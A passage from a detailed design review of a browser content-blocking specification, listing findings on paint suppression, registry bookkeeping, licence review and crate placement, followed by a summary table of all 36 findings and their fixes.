**Problem.** A blocked image inside a link keeps its box and hit-testing, so a click on apparently blank space follows the ad's link. Alt text of a failed image is not painted but remains in the accessibility tree, the inconsistency the spec rejects for hiding. The renderer must learn that a load was blocked by content blocking (not by another failure) to suppress paint, which puts the `FailureReason` category inside the site process; no rule keeps it out of script-visible state, including paint-derived APIs such as IntersectionObserver v2's visibility. The amendment is addressed to the style spec, but paint and display lists are the graphics spec's.

**Evidence.** 6.2: "a blocked image or frame is not drawn, but its box, layout and hit-testing are what any failed load produces". I7: "Renderer (paint)". 9.5 style row: "paint-only suppression of blocked elements". 6.7: "`display: none` removes the element from the accessibility tree too, so a hidden ad is consistent for screen-reader and sighted users."

**Fix.** Suppress hit-testing for the suppressed box only when the element's nearest link ancestor's target is itself a blocked URL (no page-visible change: hit-testing results are not exposed to script for a click that does not occur); keep alt text drawn, or document the mismatch. Add a rule that the blocked flag is a paint-only input, never exposed to any API, with a CB-8 probe for IntersectionObserver v2. Move the amendment to the graphics spec's display-list section (with GR as owner) and keep the style row for fetch independence and procedural pseudo-classes.

---

## Low

### C27. Two signed-off Stage 1 rows are changed without being starred

CB-D22 replaces Stage 1 Section 6's "Rule-based auto-reject in **Izcal's own rule format** ... never auto-accept" with hide-first and no clicks; CB-D13 narrows Stage 1's "Per-container policy: ... block-list set" so named containers share one default set. Both are listed in 9.5 but neither is starred in 9.4. **Fix:** star CB-D22 and CB-D13, and state for each what the owner previously signed off and why it changes.

### C28. Whether users may toggle individual Izcal lists is contradictory

6.11's settings vector includes "which of Izcal's lists are on", while 6.12 says "Izcal ships one protection level, the default list set ... and 'off' per site". Each toggle splits the anonymity set (CB-D13). **Fix:** decide: either no per-list toggles (the vector drops the field), or toggles exist with the same "makes you more recognizable" label as user lists and are included in CB-8.

### C29. Owner-decision rows lack reversal triggers or costs

CB-D1, CB-D14, CB-D20 and CB-D23 have "—" as reversal trigger, and CB-D21 has "—" as cost; the template requires both. **Fix:** for example CB-D14: "a format's measured compile share on CB-2 below 90%†: drop the format or document the gap"; CB-D20: "decision-log cost breaks CB-18: sample non-block decisions"; CB-D23: "Q-CB-5 unowned at CB-M3: owner decision"; CB-D21 cost: "recording size and replay time".

### C30. † marks values borrowed from other products

The 7-day cookie cap ("Safari's figure"), the 3-site floor ("Privacy Badger's floor"), 45 days, 1 h and 10 s (the Privacy CG draft and Chrome's documentation), and 12 weeks ("the HSTS list's cadence") are marked †, which the spec defines as "set by this document from first principles". **Fix:** mark them as precedent values with their source and give the first-principles reason Izcal keeps each, or keep † and add that reason.

### C31. Registry and amendment bookkeeping

The registry records "G73 onward" as the next free number (reconciliation 2, Q19) while this spec starts at G80 per the frame note ("G1–G78 are taken"); the disposition of G79 is not recorded, and 9.5 has no Stage 1 2.2 registry row. 9.5's Stage 1 13.2 row amends a "Content blocking row" that does not exist in 13.2 today. **Fix:** add a Stage 1 2.2 row registering G80–G86 (and G87 if C6's rule is added) and recording G79 as unassigned; reword the 13.2 row as "add a content-blocking row".

### C32. One commit link in the research notes (M-1 part 3)

LG 2.5 cites a commit page of a filter-list project (a commit message in the urlhaus-filter repository; *link removed in the 2.3.3 pass*) for the claim that a downstream project labels Tranco MIT. M-1 part 3 lists commits among sources that are never evidence. The claim is graded Low and no decision depends on it. No other link in the spec or notes points to engine or blocker source: GitHub links are READMEs, wiki prose or release notes, and `firefox-source-docs.mozilla.org` pages are published documentation prose. **Fix:** remove the commit link and the claim, or cite a prose page.

### C33. MD-D14 is described as unconditional

The spec says D-S1 is amended by "MD-D14 (no noise on Izcal-rendered audio)"; MD-D14 drops the noise "once MD-30 passes", with a reversal trigger. **Fix:** say "once MD-30 passes" in the summary of Section 1 and in 6.6.

### C34. Missing open questions and unstated behaviours

Not covered: (a) the agent principal (B9): whether an agent session may change overrides or read the Protections domain, and whether agent tabs get the default set (recommend: same defaults, no write access to protection settings, reads limited to the agent's origin set); (b) private windows: overrides and bounce state memory-only; (c) `$popup` context: which site is F and T for a popup navigation; (d) what the user sees for a blocked top-level navigation (Security entries); (e) the witness operators for C5; (f) whether the system service, which already talks to Izcal's update and trust-data servers, should also fetch arbitrary third-party list URLs or delegate them to a separate fetcher. **Fix:** add them as Q-CB-14 onward or decide them in the text.

### C35. Entity-data inputs need licence and personal-data review

The entity map ships under MIT and is built "from RDAP and WHOIS, certificate subject alternative names, CNAME chains and corporate records". Corporate-record databases are often licensed (for example under database licences with share-alike terms), and registrant data can be personal data. **Fix:** list each input with its licence and a legal reading in Q-CB-1's request, store only organisation-level facts, and record the provenance per entity like any entry.

### C36. `hg-cb-resources` placement

`hg-cb-resources` is placed in L2s, which G24 reserves for crates linked by renderers and by network services or the broker; per 6.6 the neutral resources and surrogates are served by the partition service, so nothing in the spec says a renderer links it. Conversely, `:has-text()` runs linear-time automata inside `hg-style`, so the automaton reader in `hg-cb-format` (L2s) is linked by renderers, which is correct and should be stated. **Fix:** move `hg-cb-resources` to L5, or state which renderer component links it, and state that `hg-style` links `hg-cb-format`'s automaton reader.

---

## Summary

| ID | Severity | Area | One-line fix |
|---|---|---|---|
| C1 | High | NW 6.9 contradiction; bounce tracking | Amend NW 6.9 in 9.5; define SAA behaviour, write notifications, deletion capability and the interaction store's retention |
| C2 | High | Matcher semantics | Scope exceptions by trust domain (bundle, user, each user list); "allow one party" acts on a party |
| C3 | High | Restrict action; JS attribution; FP-D7 | JS-spec amendment for API-call attribution with creator inheritance; honest threat model; laundering suite; no FP-D7 report for restrict caps |
| C4 | High | Security; G81; CB-D15 | Allow-list `csp=` directives; reject `report-uri`, `report-to` and host sources; extend CB-5 and CB-7 |
| C5 | High | Delivery security; CB-22 | Witness-cosigned checkpoints with consistency proofs; name the verifying process; restate CB-22 |
| C6 | High | M-1; surrogates | Remove source-based generation; provenance manifest per surrogate (G87) |
| C7 | High | P2 scope note; CB-D5 | Drop resource-only Ads entries (use FP-D7), or make them opt-in, or ask the owner to amend P2 |
| C8 | Medium | FP-28; performance | Keep per request or amend FP-28; add a cold-start p99 case |
| C9 | Medium | FP-D16 | Amend FP-D16: key compiled files by source hash, user-list files per container |
| C10 | Medium | NW-54; NW 6.15 | Amend NW-54's denominator for Anti-fraud and Restrict; list the bot-detection exemption |
| C11 | Medium | Debouncing | Admit only unconditional redirectors; exclude scanners and signed redirectors; no-referrer |
| C12 | Medium | HTML deviation; WPT; P2 | State observable outcome, broker-owned activation, P2 class; add a WPT-difference target |
| C13 | Medium | Privacy; style feasibility | Narrow fetch independence to backgrounds and fonts; list lazy images and computed style as residuals |
| C14 | Medium | Report privacy; DT-1; NW-D17 | Host-only default, redacted path opt-in; reload-to-record flow; follow or amend NW-D17's fallback |
| C15 | Medium | Process placement (NW-D3, I-1 spirit) | Stripping and debouncing in the partition service; only bounce bookkeeping in the container service |
| C16 | Medium | Routes; NW-D17 | Fetch routed containers' user lists through their route |
| C17 | Medium | Determinism; updates | Security additions mid-page as recorded inputs; worker versions; record user lists; compiler determinism target |
| C18 | Medium | DNS uncloaking | List configurations without phase B; scope CB-13 |
| C19 | Medium | Owner direction; 13.1a | Classify `WKContentRuleList` as an OS interface for the owner; WebView2 matching in a partition service |
| C20 | Medium | Licence; G84 | Coverage results aggregate-only and unreadable by the candidate pipeline |
| C21 | Medium | Staffing | Cost the second reviewer; fix person-years; one home for importers; add log and entity work |
| C22 | Medium | Falsifiability | Independent oracle for CB-11/12; statistics for CB-8; thresholds for CB-20, CB-25; rescope CB-17 |
| C23 | Medium | Footprint realism | Measure common lists' generic subsets; shared generic sheet; refusal message |
| C24 | Medium | Staging | Ship non-resource Ads entries at CB-M3 |
| C25 | Medium | Cosmetic security; G80 | Compile to (selector AST, fixed action); verifier re-parse; reword G80 |
| C26 | Medium | Paint suppression; ownership | Fix invisible link targets and AT mismatch; blocked flag paint-only; amend the graphics spec |
| C27 | Low | Owner rows | Star CB-D22 and CB-D13 |
| C28 | Low | Uniformity | Decide per-list toggles |
| C29 | Low | Owner rows | Add reversal triggers and the missing cost |
| C30 | Low | † usage | Mark borrowed values as precedents with reasons |
| C31 | Low | Registry; 9.5 | Register G80–G86, record G79; reword the 13.2 row |
| C32 | Low | M-1 part 3 | Remove the commit link in LG 2.5 |
| C33 | Low | D-S1 amendments | MD-D14 is conditional on MD-30 |
| C34 | Low | Open questions | Agents, private windows, popups, blocked top-level navigations, witnesses, system-service fetches |
| C35 | Low | Licence; privacy | Licence and personal-data review of entity-data inputs |
| C36 | Low | Crate layers (G24) | Move `hg-cb-resources` to L5 or justify L2s; state `hg-style` links the automaton reader |

**Counts:** 36 findings: **7 High**, **19 Medium**, **10 Low**.

**What holds up.** The layered model, the closed intervention vocabulary with no list-supplied code, no on-device learning, one uniform default bundle, budgets in place of rule caps, the reference matcher before the compiled matcher, the total precedence order, NW-D17's reading (the public bundle fetched plainly on a schedule identical for every client, OHTTP for reports) and the decision-log-based explanations are consistent with the accepted specs and with the owner's direction. No third-party engine or list is shipped, and apart from C32 the evidence trail is prose and black-box only.
